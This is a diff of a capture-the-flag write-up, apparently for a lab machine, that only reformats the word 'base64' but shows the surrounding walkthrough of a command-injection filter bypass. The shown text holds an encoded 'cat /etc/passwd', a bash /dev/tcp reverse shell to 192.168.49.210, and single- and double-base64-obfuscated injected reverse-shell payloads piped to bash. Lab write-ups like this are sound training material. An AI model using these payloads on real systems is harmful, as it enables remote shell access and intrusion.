@@ -74,7 +74,7 @@ echo "<pre>$outer</pre>";
 ?>
 ```
 
-Looks like there are blacklisted characters and commands, that's why we can't `ls` and `cat /etc/passwd`. From here I thought we can try try echoing a base64 encoded command then pipe it to `base64 -d` then to `bash`. Something like the following:
+Looks like there are blacklisted characters and commands, that's why we can't `ls` and `cat /etc/passwd`. From here I thought we can try try echoing a `base64` encoded command then pipe it to `base64 -d` then to `bash`. Something like the following:
 ```bash
 echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash`
 ```
@@ -87,17 +87,17 @@ And it worked, so I tried with a reverse shell
 bash -i >& /dev/tcp/192.168.49.210/80 0>&1
 ```
     
-For some reason the following base64 encoded reverse shell payload still did not work:
+For some reason the following `base64` encoded reverse shell payload still did not work:
 
 ```bash 
 |echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx'|base64 -d|bash
 ``` 
 
-Which is really weird not sure why. So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the base64 decoded payload instead of executing it with bash, and I got the following response
+Which is really weird not sure why. So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the `base64` decoded payload instead of executing it with bash, and I got the following response
            
 ![](\assets\images\noname-pg\2022-07-27-16-48-44.png)
 
-Looks like it is not printing the whole base64 encoded command. not sure why but that's the reason our reverse shell is not getting executed properly. From here I tried double `base64` encoding my payload and it worked 
+Looks like it is not printing the whole `base64` encoded command. not sure why but that's the reason our reverse shell is not getting executed properly. From here I tried double `base64` encoding my payload and it worked 
 
 ```bash
 |echo 'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64 -d|base64 -d|bash`
